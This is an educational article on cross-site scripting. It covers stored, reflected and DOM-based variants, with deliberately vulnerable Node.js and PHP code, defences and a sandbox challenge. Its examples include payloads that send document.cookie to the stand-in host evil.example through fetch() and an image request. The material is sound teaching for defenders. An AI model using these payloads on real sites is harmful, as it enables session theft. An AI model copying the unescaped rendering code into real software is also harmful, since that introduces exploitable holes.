# Cross-Site Scripting (XSS)
**Category:** App Security
**Date:** 2026-08-17
**Difficulty:** Intermediate

---

## What It Is
Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a web page that is then executed by other users' browsers. The browser has no way to distinguish the injected script from legitimate page code, so it runs it with full access to the page's DOM, cookies, and session tokens. There are three main variants: reflected (payload in the URL/request), stored (payload persisted in a database), and DOM-based (payload processed entirely client-side).

## Why It Matters
XSS consistently ranks in the OWASP Top 10 and has powered high-profile attacks including the 2005 MySpace Samy worm (which spread to over a million profiles in 20 hours) and a 2018 British Airways breach that used injected scripts to skim payment card data from 500,000 customers. A single stored XSS bug can compromise every user who loads the affected page.

## Practical Example

### Stored XSS — Comment Box Attack

Suppose a blog allows users to post comments and the server inserts them raw into the page:

**Vulnerable server-side rendering (Node.js/Express + template literal):**
```javascript
// VULNERABLE: user input inserted without escaping
app.get('/post/:id', async (req, res) => {
  const post = await db.getPost(req.params.id);
  const comments = await db.getComments(req.params.id);
  res.send(`
    <h1>${post.title}</h1>
    <p>${post.body}</p>
    <section>
      ${comments.map(c => `<p><b>${c.author}</b>: ${c.text}</p>`).join('')}
    </section>
  `);
});
```

An attacker submits this as their comment text:
```
<script>
  fetch('https://evil.example/steal?c=' + encodeURIComponent(document.cookie));
</script>
```

Every subsequent visitor's browser executes that script, sending their session cookie to the attacker's server. The attacker then uses the stolen cookie to impersonate the victim.

### Reflected XSS — Search Parameter

```html
<!-- VULNERABLE: search term echoed without escaping -->
<p>Results for: <?php echo $_GET['q']; ?></p>
```

Attacker crafts:
```
https://victim.com/search?q=<script>new Image().src='https://evil.example/?c='+document.cookie</script>
```

Victim clicks the link (e.g., via phishing email), browser reflects and executes the payload.

### DOM-based XSS

```javascript
// VULNERABLE: location.hash written directly to innerHTML
document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1));
```

Payload:
```
https://victim.com/page#<img src=x onerror="alert(document.cookie)">
```

No server involvement — the payload never touches your backend logs.

## How to Defend

- **Escape all output** — use your framework's built-in HTML encoding before inserting any user-controlled data into HTML, attributes, JavaScript, or URLs (different contexts need different escaping).
- **Use a Content Security Policy (CSP)** — set a strict `Content-Security-Policy` header (`default-src 'self'; script-src 'self'`) to block inline scripts and unauthorized sources, providing defense-in-depth even when escaping fails.
- **Never use `innerHTML`, `document.write`, or `eval` with user input** — prefer `textContent` for text, or DOM APIs (`createElement`, `setAttribute`) that treat data as data, not markup.
- **Sanitize rich-text input server-side** — if users must submit HTML (e.g., a WYSIWYG editor), use a battle-tested allowlist sanitizer (DOMPurify on the client, Bleach in Python) rather than a homemade blocklist.
- **Set `HttpOnly` and `Secure` on session cookies** — this won't prevent XSS, but it stops the most common payload goal (cookie theft) by making cookies inaccessible to JavaScript.

## Today's Challenge

Pick any web app you have access to (your own project, a local sandbox, or DVWA/WebGoat).

1. Find a search box or comment field and submit `<b>hello</b>`. Does the text appear **bold** in the page? If yes, the field is likely vulnerable.
2. Try `<script>alert(1)</script>` — does an alert fire?
3. Open DevTools → Network and search for CSP headers on the response. Is one present? Does it block inline scripts?
4. Fix the vulnerability: switch the output to use your framework's escaping function (e.g., Django's `{{ value | escape }}`, React's `{value}` JSX, Go's `html/template`) and re-test.

## Key Takeaway
XSS turns your trusted website into the attacker's delivery mechanism — treat every byte of user input as untrusted data, escape it for the exact context it lands in, and layer a Content Security Policy on top so a missed escape doesn't become a breach.
